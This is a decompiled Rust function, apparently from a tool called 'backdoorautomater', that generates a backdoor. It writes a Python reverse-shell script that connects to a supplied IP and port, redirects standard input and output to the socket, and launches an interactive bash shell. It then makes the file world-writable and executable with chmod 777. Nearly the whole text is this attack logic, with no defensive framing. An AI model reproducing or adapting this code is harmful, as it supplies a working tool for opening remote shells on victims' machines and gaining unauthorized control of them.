fn backdoorautomater::cronshell::write_shell_pyfile(a0: &struct24, a1: &struct24, a2: &struct24) -> u64 {
    let v0: std::fs::File;  // [bp-0x1ec]
    let v1: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x1e8]
    let v2: u64;  // [bp-0x1e0]
    let v3: u64;  // [bp-0x1d8]
    let v4: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x1c8]
    let v5: u64;  // [bp-0x1c0]
    let v6: u64;  // [bp-0x1b8]
    let v7: alloc::borrow::Cow<str>;  // [bp-0x1a8], Other Possible Types: core::result::Result<std::process::Output, std::io::error::Error>, struct24, alloc::vec::Vec<u8, alloc::alloc::Global>
    let v8: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x1a8]
    let v9: u64;  // [bp-0x198]
    let v10: u128;  // [bp-0x168]
    let v11: struct24;  // [bp-0x168]
    let v12: u64;  // [bp-0x158]
    let v13: struct24;  // [bp-0x148]
    let v14: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0x130], Other Possible Types: struct149, struct24
    let v15: &str;  // [bp-0x130]
    let v16: &str;  // [bp-0x130]
    let v17: struct24;  // [bp-0x130]
    let v18: &str;  // [bp-0x130]
    let v19: std::fs::File;  // [bp-0x12c]
    let v20: core::fmt::Arguments;  // [bp-0x128]
    let v21: core::result::Result<std::process::Output, std::io::error::Error>;  // [bp-0x120], Other Possible Types: u128
    let v22: struct56;  // [bp-0x60]
    let v23: u64;  // [bp-0x40]
    let v25: core::fmt::Arguments;  // r12

    v14 = std::fs::File::create(a2, a2);
    match v14 {
        Err(v25) => {
        },
        Ok(v0) => {
            v25 = std::io::Write::write_all(&v0, "import socket,subprocess,os;\n");
            if !v25 {
                v25 = std::io::Write::write_all(&v0, "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n");
                if !v25 {
                    v18 = "v_ip='";
                    v21 = *((a1 + 8) as &i128);
                    v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                    v1 = v8;
                    alloc::vec::Vec<T,A>::extend_from_slice(&v1, "';\n");
                    v25 = std::io::Write::write_all(&v0, v2, v3);
                    if !v25 {
                        v15 = "s.connect((v_ip,";
                        v21 = *((a0 + 8) as &i128);
                        v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                        v4 = v8;
                        alloc::vec::Vec<T,A>::extend_from_slice(&v4, "));\n");
                        v25 = std::io::Write::write_all(&v0, v5, v6);
                        if !v25 {
                            v25 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),0);\n");
                            if !v25 {
                                v25 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),1);\n");
                                if !v25 {
                                    v25 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),2);\n");
                                    if !v25 {
                                        v25 = std::io::Write::write_all(&v0, "v_shell_path='/usr/bin/bash';\n");
                                        if !v25 {
                                            v25 = std::io::Write::write_all(&v0, "v_shell_value='-i';\n");
                                            if !v25 {
                                                v25 = std::io::Write::write_all(&v0, "p=subprocess.call([v_shell_path,v_shell_value]);\n");
                                                if !v25 {
                                                    v16 = "chmod 777 ";
                                                    v21 = *((a2 + 8) as &i128);
                                                    v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                                                    v12 = v9;
                                                    v10 = *(&v7.buf.cap as &i128);
                                                    v14 = std::process::Command::new("sh");
                                                    v7 = v11;
                                                    v7 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v14, "-c"), &v7));
                                                    v22 = core::result::Result<T,E>::expect(&v7, "src/cronshell.rs");
                                                    v7 = alloc::string::String::from_utf8_lossy(v23, *((&v22.field_32 as &char + 8) as &i64));
                                                    v14 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v7), a2);
                                                    v13 = v17;
                                                    backdoorautomater::sanitizer::sanitize_system_command(&v13);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
    }
    return v25;
}
